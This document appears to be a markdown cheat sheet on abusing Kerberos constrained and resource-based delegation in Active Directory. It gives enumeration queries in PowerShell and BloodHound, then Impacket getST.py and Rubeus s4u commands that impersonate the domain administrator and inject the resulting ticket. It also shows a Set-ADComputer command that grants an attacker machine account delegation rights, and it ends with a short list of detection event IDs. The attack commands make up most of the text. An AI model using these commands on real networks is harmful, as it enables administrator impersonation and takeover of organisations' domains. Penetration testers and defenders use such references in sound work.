# API Reference: Kerberos Constrained Delegation Abuse

## Delegation Types in AD

| Type | Attribute | Risk |
|------|-----------|------|
| Unconstrained | TrustedForDelegation | CRITICAL |
| Constrained | msDS-AllowedToDelegateTo | HIGH |
| Constrained + Protocol Transition | TrustedToAuthForDelegation | CRITICAL |
| Resource-Based (RBCD) | msDS-AllowedToActOnBehalfOfOtherIdentity | HIGH |

## PowerShell Enumeration

### Find Constrained Delegation
```powershell
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} `
    -Properties msDS-AllowedToDelegateTo, TrustedToAuthForDelegation
```

### Find RBCD
```powershell
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity `
    | Where-Object {$_.'msDS-AllowedToActOnBehalfOfOtherIdentity' -ne $null}
```

## Impacket — S4U Attack

### getST.py — Request Service Ticket
```bash
getST.py domain/svc_account:password \
    -spn cifs/target.domain.local \
    -impersonate administrator \
    -dc-ip 10.10.10.1
```

### Use Ticket
```bash
export KRB5CCNAME=administrator.ccache
smbclient.py -k -no-pass domain/administrator@target.domain.local
```

## Rubeus — S4U Attack

### S4U2Self + S4U2Proxy
```cmd
Rubeus.exe s4u /user:svc_account /rc4:NTLM_HASH \
    /impersonateuser:administrator \
    /msdsspn:cifs/target.domain.local /ptt
```

### RBCD Abuse
```cmd
Rubeus.exe s4u /user:MACHINE$ /rc4:MACHINE_HASH \
    /impersonateuser:administrator \
    /msdsspn:cifs/target.domain.local /ptt
```

## RBCD Setup with PowerShell

### Set RBCD
```powershell
Set-ADComputer target -PrincipalsAllowedToDelegateToAccount attacker$
```

### Verify
```powershell
Get-ADComputer target -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
```

## BloodHound Cypher Queries

### Constrained Delegation Paths
```cypher
MATCH p=(u)-[:AllowedToDelegate]->(c:Computer)
RETURN u.name, c.name
```

### RBCD Write Access
```cypher
MATCH p=(u)-[:GenericWrite|WriteDacl|WriteOwner]->(c:Computer)
RETURN u.name, c.name
```

## Detection — Event IDs
| Event | Description |
|-------|-------------|
| 4769 | Kerberos Service Ticket (check for S4U) |
| 4770 | Service Ticket Renewed |
| 4768 | TGT Request (monitor for delegation) |
